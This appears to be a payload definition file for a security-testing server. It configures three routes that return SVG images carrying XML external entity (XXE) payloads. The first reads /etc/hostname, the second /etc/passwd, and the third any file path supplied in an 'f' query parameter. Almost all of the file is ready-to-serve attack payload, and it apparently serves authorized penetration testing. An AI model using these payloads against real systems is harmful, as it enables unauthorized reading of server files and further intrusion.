---
title: XXE SVG
description: Returns an SVG payload with XXE to get files
weight: 1
payloads:
  - sort_order: 1
    pattern: /sh$
    data:
      headers:
        Content-Type: text/xml
        body: |
          <?xml version="1.0" standalone="yes"?>
          <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
          <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
          <text font-size="16" x="0" y="16">&xxe;</text>
          </svg>


  - sort_order: 1
    pattern: /sp$
    data:
      headers:
        Content-Type: image/svg+xml
        body: |
          <?xml version="1.0" standalone="yes"?>
          <!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
          <svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
          <text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text>
          </svg>


  - sort_order: 1
    pattern: /sv$
    data:
      headers:
        Content-Type: image/svg+xml
        body: |
          <?xml version="1.0" standalone="yes"?>
          <!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file://{{.GET_f}}" > ]>
          <svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
          <text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text>
          </svg>

---

SVG with XXE payloads

### /sh

attempts to get /etc/hostname

SVG with XXE payloads

### /sp

attempts to get /etc/passwd

### /sv

attempts to get whatever files is supplied via the `f` query parameter
